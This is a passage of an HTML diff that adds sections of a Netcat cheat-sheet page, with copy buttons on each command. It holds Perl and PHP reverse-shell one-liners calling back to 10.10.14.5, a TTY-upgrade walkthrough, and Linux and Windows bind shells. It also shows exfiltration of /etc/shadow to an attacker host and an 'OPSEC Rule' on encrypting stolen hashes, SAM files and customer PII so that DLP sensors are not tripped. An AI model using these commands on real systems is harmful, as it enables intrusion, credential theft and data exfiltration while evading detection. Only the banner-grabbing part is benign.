+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Python 3 socket reverse shell</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">perl</span> <span class="tok-flag">-e</span> <span class="tok-val">'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Perl socket reverse shell</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">php</span> <span class="tok-flag">-r</span> <span class="tok-val">'$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">PHP CLI reverse shell</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 4: Interactive TTY Upgrade -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Full TTY terminal upgrade (Step-by-step)</div>
+              <div class="cmd-block__desc">Transform a dumb, raw Netcat reverse shell into a fully interactive PTY with job control, Tab-completion, and editor support.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span style="background: rgba(0, 200, 168, 0.18); color: var(--tool-color); border-radius: 4px; padding: 2px 7px; font-size: 10px; font-weight: 700; margin-right: var(--sp-2); white-space: nowrap;">Step 1</span>
+              <span class="code-line__prompt" aria-hidden="true">target$</span>
+              <code class="code-line__code"><span class="tok-cmd">python3</span> <span class="tok-flag">-c</span> <span class="tok-val">'import pty; pty.spawn("/bin/bash")'</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Spawn remote PTY on target</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span style="background: rgba(0, 200, 168, 0.18); color: var(--tool-color); border-radius: 4px; padding: 2px 7px; font-size: 10px; font-weight: 700; margin-right: var(--sp-2); white-space: nowrap;">Step 2</span>
+              <span class="code-line__prompt" aria-hidden="true">attacker$</span>
+              <code class="code-line__code"><span class="tok-cmd">Ctrl+Z</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Send Netcat process to attacker background</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span style="background: rgba(0, 200, 168, 0.18); color: var(--tool-color); border-radius: 4px; padding: 2px 7px; font-size: 10px; font-weight: 700; margin-right: var(--sp-2); white-space: nowrap;">Step 3</span>
+              <span class="code-line__prompt" aria-hidden="true">attacker$</span>
+              <code class="code-line__code"><span class="tok-cmd">stty</span> <span class="tok-val">raw</span> <span class="tok-flag">-echo</span>; <span class="tok-cmd">fg</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Enable raw terminal mode and return to shell</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span style="background: rgba(0, 200, 168, 0.18); color: var(--tool-color); border-radius: 4px; padding: 2px 7px; font-size: 10px; font-weight: 700; margin-right: var(--sp-2); white-space: nowrap;">Step 4</span>
+              <span class="code-line__prompt" aria-hidden="true">target$</span>
+              <code class="code-line__code"><span class="tok-cmd">reset</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Re-initialize terminal capability</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span style="background: rgba(0, 200, 168, 0.18); color: var(--tool-color); border-radius: 4px; padding: 2px 7px; font-size: 10px; font-weight: 700; margin-right: var(--sp-2); white-space: nowrap;">Step 5</span>
+              <span class="code-line__prompt" aria-hidden="true">target$</span>
+              <code class="code-line__code"><span class="tok-cmd">export</span> <span class="tok-val">TERM=xterm-256color</span> &amp;&amp; <span class="tok-cmd">export</span> <span class="tok-val">SHELL=bash</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Set 256-color terminal and shell environment</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span style="background: rgba(0, 200, 168, 0.18); color: var(--tool-color); border-radius: 4px; padding: 2px 7px; font-size: 10px; font-weight: 700; margin-right: var(--sp-2); white-space: nowrap;">Step 6</span>
+              <span class="code-line__prompt" aria-hidden="true">target$</span>
+              <code class="code-line__code"><span class="tok-cmd">stty</span> <span class="tok-val">rows &lt;rows&gt; columns &lt;cols&gt;</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Replace with dimensions from attacker 'stty size'</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); border-top: 1px solid rgba(255, 255, 255, 0.06); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-accent); font-weight: 600;">Dimension Calibration:</span> Run <code>stty size</code> in your local attacker terminal to view your current rows and columns (e.g. <code>42 160</code>), then replace <code>&lt;rows&gt;</code> and <code>&lt;cols&gt;</code> with your dimensions so full-screen text editors (nano, vim) render without display corruption.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 3. Bind Shells -->
+    <section class="content-section" id="bind-shells" aria-labelledby="bind-shells-title">
+      <h2 class="content-section__title" id="bind-shells-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+        Bind Shells (Inbound Target Control)
+      </h2>
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Linux Bind Shell -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Linux bind shell listeners</div>
+              <div class="cmd-block__desc">Target opens a listening port and waits for the attacker to connect inbound.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">target$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">4444</span> <span class="tok-flag">-e</span> <span class="tok-val">/bin/bash</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Requires netcat with -e enabled</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">target$</span>
+              <code class="code-line__code"><span class="tok-cmd">rm</span> <span class="tok-flag">-f</span> <span class="tok-val">/tmp/b</span>; <span class="tok-cmd">mkfifo</span> <span class="tok-val">/tmp/b</span> &amp;&amp; <span class="tok-cmd">cat</span> <span class="tok-val">/tmp/b</span> <span class="tok-pipe">|</span> <span class="tok-cmd">/bin/sh</span> <span class="tok-flag">-i</span> <span class="tok-val">2&gt;&amp;1</span> <span class="tok-pipe">|</span> <span class="tok-cmd">nc</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">4444</span> <span class="tok-pipe">&gt;</span> <span class="tok-val">/tmp/b</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">FIFO bind shell when -e is unavailable</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">target$</span>
+              <code class="code-line__code"><span class="tok-cmd">ncat</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">4444</span> <span class="tok-flag">-e</span> <span class="tok-val">/bin/bash</span> <span class="tok-flag">--ssl</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Encrypted SSL Linux bind shell</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: Windows Bind Shell -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Windows bind shell listeners</div>
+              <div class="cmd-block__desc">Bind cmd.exe or PowerShell to a listening TCP socket on a compromised Windows host.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">C:\&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">nc.exe</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">4444</span> <span class="tok-flag">-e</span> <span class="tok-val">cmd.exe</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Spawns cmd.exe upon connection</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">C:\&gt;</span>
+              <code class="code-line__code"><span class="tok-cmd">ncat.exe</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">4444</span> <span class="tok-flag">-e</span> <span class="tok-val">powershell.exe</span> <span class="tok-flag">--ssl</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Encrypted PowerShell bind shell</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 3: Connecting to Bind Shell -->
+        <div class="cmd-block" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Connecting to a remote bind shell</div>
+              <div class="cmd-block__desc">Initiate an inbound connection from the attacker machine to the listening target port.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">attacker$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-arg">10.10.10.1</span> <span class="tok-val">4444</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Connect to unencrypted target bind shell</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">attacker$</span>
+              <code class="code-line__code"><span class="tok-cmd">ncat</span> <span class="tok-flag">--ssl</span> <span class="tok-arg">10.10.10.1</span> <span class="tok-val">4444</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Connect to SSL-encrypted target bind shell</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 4. File Transfer -->
+    <section class="content-section" id="transfer" aria-labelledby="transfer-title">
+      <h2 class="content-section__title" id="transfer-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+        File Transfer &amp; Exfiltration
+      </h2>
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Cleartext File Transfer -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Cleartext file transfer (Standard redirection)</div>
+              <div class="cmd-block__desc">Stream binary files or archives across a raw TCP socket until EOF is reached.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div style="font-size: var(--t-xs); font-weight: 700; color: var(--c-accent); padding: var(--sp-2) var(--sp-4) var(--sp-1); text-transform: uppercase; letter-spacing: 0.05em;">
+              Workflow: Push file from attacker to target
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">target$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">9999</span> <span class="tok-pipe">&gt;</span> <span class="tok-arg">received_tool.elf</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">1. Target starts listener waiting for bytes</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">attacker$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-arg">10.10.10.1</span> <span class="tok-val">9999</span> <span class="tok-pipe">&lt;</span> <span class="tok-arg">local_tool.elf</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">2. Attacker transmits file contents and sends EOF</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div style="font-size: var(--t-xs); font-weight: 700; color: var(--c-accent); padding: var(--sp-3) var(--sp-4) var(--sp-1); border-top: 1px solid rgba(255, 255, 255, 0.06); text-transform: uppercase; letter-spacing: 0.05em;">
+              Workflow: Exfiltrate data from target to attacker
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">attacker$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">9999</span> <span class="tok-pipe">&gt;</span> <span class="tok-arg">loot_passwords.txt</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">1. Attacker receives exfiltrated data stream</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">target$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-arg">10.10.14.5</span> <span class="tok-val">9999</span> <span class="tok-pipe">&lt;</span> <span class="tok-arg">/etc/shadow</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">2. Target sends sensitive file outbound</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: Encrypted Transfer (Ncat SSL) -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Encrypted file exfiltration (Ncat only: --ssl)</div>
+              <div class="cmd-block__desc">Transfer sensitive archives, NTDS.dit files, and credentials without revealing data in transit.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">attacker$</span>
+              <code class="code-line__code"><span class="tok-cmd">ncat</span> <span class="tok-flag">--ssl</span> <span class="tok-flag">-lvnp</span> <span class="tok-val">9999</span> <span class="tok-pipe">&gt;</span> <span class="tok-arg">confidential_backup.tar.gz</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Encrypted SSL receiver</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">target$</span>
+              <code class="code-line__code"><span class="tok-cmd">ncat</span> <span class="tok-flag">--ssl</span> <span class="tok-arg">10.10.14.5</span> <span class="tok-val">9999</span> <span class="tok-pipe">&lt;</span> <span class="tok-arg">sensitive_backup.tar.gz</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Encrypted SSL sender</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div style="font-size: var(--t-xs); color: var(--c-muted); padding: var(--sp-2) var(--sp-4); border-top: 1px solid rgba(255, 255, 255, 0.06); background: rgba(0, 0, 0, 0.12);">
+              <span style="color: var(--c-accent); font-weight: 600;">OPSEC Rule:</span> Always use SSL encryption when transferring password hashes, SAM files, memory dumps, or customer PII. Cleartext Netcat transfers will trip network DLP sensors and trigger incident response.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- 5. Scanning & Banner Grabbing -->
+    <section class="content-section" id="scanning" aria-labelledby="scanning-title">
+      <h2 class="content-section__title" id="scanning-title">
+        <svg class="content-section__title-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+        Scanning &amp; Banner Grabbing
+      </h2>
+
+      <div class="callout callout--info" role="note" style="margin-bottom:var(--sp-4);">
+        <svg class="callout__icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+        <div class="callout__body">
+          <strong style="display:block; margin-bottom:var(--sp-1); color:var(--c-text);">Netcat is not a full port scanner.</strong>
+          Netcat lacks Nmap's service fingerprinting, OS detection engine, NSE scripting engine, and adaptive timing. Use Netcat exclusively for targeted single-port checks, firewall rule verification, and raw banner grabbing — not for large subnet auditing.
+        </div>
+      </div>
+
+      <div class="cmd-list" role="list">
+        <!-- Block 1: Banner Grabbing with Timeout -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Banner grabbing with timeout (-w)</div>
+              <div class="cmd-block__desc">Inspect raw service identification strings without hanging indefinitely on filtered or silent ports.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-flag">-w</span> <span class="tok-val">3</span> <span class="tok-arg">10.10.10.1</span> <span class="tok-val">22</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Grab OpenSSH version banner with 3-second timeout</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-flag">-w</span> <span class="tok-val">3</span> <span class="tok-arg">10.10.10.1</span> <span class="tok-val">21</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Inspect FTP service banner</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
+              <code class="code-line__code"><span class="tok-cmd">nc</span> <span class="tok-flag">-w</span> <span class="tok-val">3</span> <span class="tok-arg">10.10.10.1</span> <span class="tok-val">25</span></code>
+              <span class="tok-com" style="margin-left:auto; margin-right:var(--sp-3); font-size:var(--t-xs); opacity:0.85;">Inspect SMTP mail exchange daemon banner</span>
+              <button class="code-line__copy-btn" aria-label="Copy command"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Block 2: HTTP Raw Request -->
+        <div class="cmd-block is-open" role="listitem">
+          <div class="cmd-block__head">
+            <div>
+              <div class="cmd-block__label">Manual HTTP service banner extraction</div>
+              <div class="cmd-block__desc">Send RFC-compliant HTTP requests directly through Netcat to inspect web server headers.</div>
+            </div>
+            <svg class="cmd-block__expand-btn" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"/></svg>
+          </div>
+          <div class="cmd-block__body">
+            <div class="code-line">
+              <span class="code-line__prompt" aria-hidden="true">$</span>
